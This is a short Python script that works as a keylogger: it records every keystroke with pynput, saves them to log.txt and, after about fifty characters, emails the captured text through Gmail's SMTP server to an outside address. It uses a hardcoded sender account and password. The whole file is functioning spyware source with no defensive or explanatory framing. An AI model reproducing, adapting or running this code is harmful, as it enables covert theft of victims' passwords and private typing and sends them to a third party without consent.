from pynput.keyboard import Listener
from threading import Timer
import smtplib


email='lohacker314@gmail.com'
password='tvfxdnbyzmvjhonw'
email_sent='dunggsx@gmail.com'
rs=''


def anosymous(key):
    global rs
    key = str(key)
    if(key == "Key.enter"):
        key = "\n"
    if(key=="Key.backspace"):
        key="<-"
    if(key == "Key.space"):
        key=" "
    with open("log.txt", "a") as file:
        file.write(key.replace("'",""))
    rs+=key
    if(len(rs) > 50):
        session=smtplib.SMTP('smtp.gmail.com',587)
        session.starttls() 
        session.login(email,password)
        session.sendmail(email,email_sent,rs.replace("'",""))
        rs=""
        


with Listener(on_press=anosymous) as listener:
    listener.join()

